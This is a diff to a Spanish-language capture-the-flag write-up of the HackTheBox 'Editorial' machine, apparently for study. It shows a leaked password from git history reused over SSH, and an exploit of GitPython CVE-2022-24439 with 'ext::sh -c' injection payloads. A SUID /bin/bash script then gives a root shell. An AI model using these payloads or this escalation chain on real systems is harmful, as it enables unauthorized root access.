@@ -386,6 +386,8 @@ ca92c***************************
 
 ### Private Github Project Enumeration + Information Leakage
 
+Revisamos si el usuario `dev` disponía de algún permiso de `sudoers`, pero no era el caso, y tampoco formaba parte de ningún grupo interesante. Por otro lado, también comprobamos los usuarios que disponían de una `bash`, entre los que encontramos que existía un usuario llamado `prod`, con lo cual nos hizo pensar que quizás antes de realizar la escalada al usuario `root`, debíamos pivotar al usuario `prod`.
+
 ```bash
 dev@editorial:~$ sudo -l
 [sudo] password for dev: 
@@ -400,7 +402,9 @@ prod:x:1000:1000:Alirio Acosta:/home/prod:/bin/bash
 dev:x:1001:1001::/home/dev:/bin/bash
 ```
 
+Por lo tanto, decidimos realizar una enumeración más exhausta del sistema, explorando archivos, directorios, etc.
 
+Enumerando el directorio `/opt/internal_apps` nos encontramos con diferentes directorios entre los cuales con el usuario `dev` no disponíamos del acceso.
 
 ```bash
 dev@editorial:/opt/internal_apps$ ls -l
@@ -408,21 +412,22 @@ total 12
 drwxr-xr-x 3 root     root     4096 Jun  5  2024 app_api
 drwxr-x--- 2 root     prod     4096 Jun  5  2024 clone_changes
 drwxr-xr-x 2 www-data www-data 4096 Jun  5  2024 environment_scripts
+
 dev@editorial:/opt/internal_apps$ ls -l app_api/
 total 16
 -rw-r--r-- 1 root root 5273 Jan 16  2024 app.py
 drwxr-xr-x 2 root root 4096 Jun  5  2024 __pycache__
 -rwxr-xr-x 1 root root   62 Feb  4  2023 wsgi.py
+
 dev@editorial:/opt/internal_apps$ ls -l clone_changes/
 ls: cannot open directory 'clone_changes/': Permission denied
+
 dev@editorial:/opt/internal_apps$ ls -l environment_scripts/
 total 4
 -rw-r--r-- 1 www-data www-data 89 Feb  2  2023 clear.sh
 ```
 
-
-
-
+Realizando una enumeración en el dierctorio `/home/dev/apps` nos encontramos con un directorio privado de `.git` en el cual al realizar un `git status` se nos mostró el siguiente resultado.
 
 ```bash
 dev@editorial:~/apps$ ls -la
@@ -430,6 +435,7 @@ total 12
 drwxrwxr-x 3 dev dev 4096 Jun  5  2024 .
 drwxr-x--- 4 dev dev 4096 Feb 21 15:54 ..
 drwxr-xr-x 8 dev dev 4096 Jun  5  2024 .git
+
 dev@editorial:~/apps$ git status
 On branch master
 Changes not staged for commit:
@@ -491,7 +497,7 @@ Changes not staged for commit:
 no changes added to commit (use "git add" and/or "git commit -a")
 ```
 
-
+A través del comando `git log`, revisaremos los logs de los diferentes `commit` que se han ido realizando.
 
 ```bash
 dev@editorial:~/apps/.git$ git log
@@ -535,7 +541,7 @@ Date:   Sun Apr 30 20:48:43 2023 -0500
        books and validate a future post in our editorial.
 ```
 
-
+Para obtener la misma información, pero más resumida en una única línea, haremos uso del siguiente comando.
 
 ```bash
 dev@editorial:~/apps/.git$ git log --oneline
@@ -546,7 +552,7 @@ b73481b change(api): downgrading prod to dev
 3251ec9 feat: create editorial app
 ```
 
-
+Mediante el comando de `git diff` comprobaremos diferencias entre los diferentes `commits` que existen. En la compración entre los siguientes `commits`, comprobamos que aparecen las credenciales del usuario `dev` y el usuario `prod`.
 
 ```bash
 dev@editorial:~/apps/.git$ git diff b73481b 1e84a03
@@ -565,38 +571,11 @@ index 3373b14..61b786f 100644
  # -------------------------------
 ```
 
-
-
-
-
-
+Verificamos si las credenciales del usuario `prod` son válidas para autenticarse al `SSH`del equipo víctima. Finalmente comprobamos el acceso al sistema con el usuario `prod` logrando correctamente realizar el pivoting.
 
 ```bash
 ❯ sshpass -p '080217_Producti0n_2023!@' ssh prod@10.10.11.20
 Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/pro
-
- System information as of Fri Feb 21 03:55:10 PM UTC 2025
-
-  System load:           0.04
-  Usage of /:            61.0% of 6.35GB
-  Memory usage:          13%
-  Swap usage:            0%
-  Processes:             231
-  Users logged in:       1
-  IPv4 address for eth0: 10.10.11.20
-  IPv6 address for eth0: dead:beef::250:56ff:fe94:291a
-
-
-Expanded Security Maintenance for Applications is not enabled.
-
-0 updates can be applied immediately.
-
-Enable ESM Apps to receive additional future security updates.
-See https://ubuntu.com/esm or run: sudo pro status
 
 
 The list of available updates is more than a week old.
@@ -607,13 +586,11 @@ Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your 
 prod@editorial:~$ 
 ```
 
-
-
 ## Privilege Escalation
 
 ### Abusing sudoers privilege
 
-
+Revisando los permisos de `sudoers` para comprobar si el usuario `prod` disponía de alguno, nos encontramos con el siguiente resultado. Al parecer, podemos ejecutar como el usuario `root` un script de Python3 unicado en `/opt/internal_apps/clone_changes/clone_prod_change.py`.
 
 ```bash
 prod@editorial:~$ sudo -l
@@ -625,7 +602,13 @@ User prod may run the following commands on editorial:
     (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
 ```
 
+El script `clone_prod_change.py` está escrito en Python y utiliza la librería `GitPython` para clonar un repositorio desde una URL proporcionada como argumento. A continuación, desglosamos su funcionamiento:
 
+1. **Importación de módulos**: Se importan las librerías `os`, `sys` y `git` (de `GitPython`), lo que indica que el script interactúa con Git y el sistema de archivos.
+2. **Cambio de directorio**: Se cambia el directorio de trabajo a `/opt/internal_apps/clone_changes`, lo que sugiere que todas las operaciones se realizarán en esta ruta.
+3. **Obtención de la URL**: El script toma la URL del repositorio que se quiere clonar desde el primer argumento de la línea de comandos (`sys.argv[1]`).
+4. **Inicialización del repositorio**: Se crea un repositorio vacío (`bare=True`) en el directorio actual usando `Repo.init()`.
+5. **Clonación del repositorio**: Se clona el repositorio especificado en la carpeta `new_changes` mediante `r.clone_from()`, con la opción `-c protocol.ext.allow=always`, lo que permite protocolos de transporte personalizados en Git.
 
 ```bash
 prod@editorial:~$ cat /opt/internal_apps/clone_changes/clone_prod_change.py
@@ -645,7 +628,7 @@ r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=
 
 ### GitPython 3.1.29 Exploitation - Remote Code Execution \[RCE] (CVE-2022-24439)
 
-
+Revisamos la versión exacta de la libreria de `gitpython` que se está utilizando en el script y nos encontramos con la versión `3.1.29`.
 
 ```bash
 prod@editorial:~$ pip show gitpython
@@ -661,11 +644,17 @@ Requires: gitdb
 Required-by: 
 ```
 
-
+Realizando una búsqueda por Internet, nos encontramos con la siguiente vulnerabilidad de `GitPython 3.1.29` reportada como `CVE-2022-24439`.
 
 <figure><img src="../../.gitbook/assets/imagen.png" alt=""><figcaption></figcaption></figure>
 
+{% embed url="https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2022-24439" %}
 
+{% hint style="danger" %}
+Todas las versiones del paquete gitpython son vulnerables a la ejecución remota de código (RCE) debido a una validación incorrecta de la entrada del usuario, lo que hace posible inyectar una URL remota creada con fines malintencionados en el comando de clonación. Es posible explotar esta vulnerabilidad porque la librería realiza llamadas externas a git sin una sanitización suficiente de los argumentos de entrada.
+{% endhint %}
+
+Por otro lado, nos encontramos con el siguiente blog el cual nos muestran cómo poder realizar la explotación correctamente. En nuestra primera prueba, lo que realizamos es realizar la ejecución del script como `sudo` y le indicamos `'ext::sh -c touch% /tmp/pwned'` que sería la inyección a realizar. En este caso, al realizar la ejecución del script con el payload malicioso, se comprueba que se ha creado correctamente el archivo `/tmp/pwned` y el propietario es `root`. Con lo cual, hemos confirmado la existencia de un `Remote Code Execution` que es ejecutado con el usuario `root`.
 
 {% embed url="https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858" %}
 
@@ -694,7 +683,7 @@ prod@editorial:~$ ls -l /tmp/pwned
 -rw-r--r-- 1 root root 0 Feb 21 16:19 /tmp/pwned
 ```
 
-
+Por lo tanto, realizaremos el siguiente script en Bash que lo que realizará es proporcionar permisos de `SUID`al binario `/bin/bash`. Creamos el archivo, le damos los permisos de ejecución correspondientes.
 
 ```bash
 prod@editorial:/tmp$ cat exploit.sh 
@@ -706,7 +695,11 @@ prod@editorial:/tmp$ ls -l exploit.sh
 -rwxrwxr-x 1 prod prod 33 Feb 21 16:21 exploit.sh
 ```
 
+Verificamos que antes de realizar la ejecución de la vulnerabilidad, el binario `/bin/bash`no dispone de permisos de `SUID`. Una vez verificado, realizamos la ejecución del script inyectándole nuestro payload malicioso `'ext::sh -c /tmp/exploit.sh'` para que ejecute el script que hemos creado en el punto anterior.
 
+Al ejecutar el script, verificamos que el binario `/bin/bash` dispone de permisos de `SUID`, con lo cual, a través del parámetro `-p` podemos convertirnos en el propietario del binario que en este caso es `root`.
+
+Comprobamos el acceso como el usuario `root`y la visualización de la flag **root.txt**.
 
 ```bash
 prod@editorial:/tmp$ ls -l /bin/bash
@@ -740,5 +733,5 @@ prod@editorial:/tmp$ bash -p
 bash-5.1# whoami
 root
 bash-5.1# cat /root/root.txt
-aaec01e13756f0d49c387b6f970bdd47
+aaec01***************************
 ```
